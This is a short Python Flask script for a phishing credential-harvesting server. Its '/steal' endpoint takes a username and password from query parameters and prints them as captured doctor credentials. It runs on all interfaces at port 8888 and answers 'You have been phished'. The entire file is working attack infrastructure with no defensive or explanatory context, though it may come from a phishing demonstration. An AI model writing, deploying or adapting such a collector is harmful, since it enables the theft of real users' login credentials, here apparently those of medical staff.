from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    username = request.args.get('u')
    password = request.args.get('p')
    print("💥 Doctor credentials captured!")
    print("👤 Username:", username)
    print("🔑 Password:", password)
    return "✅ Credentials received. You have been phished :)"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
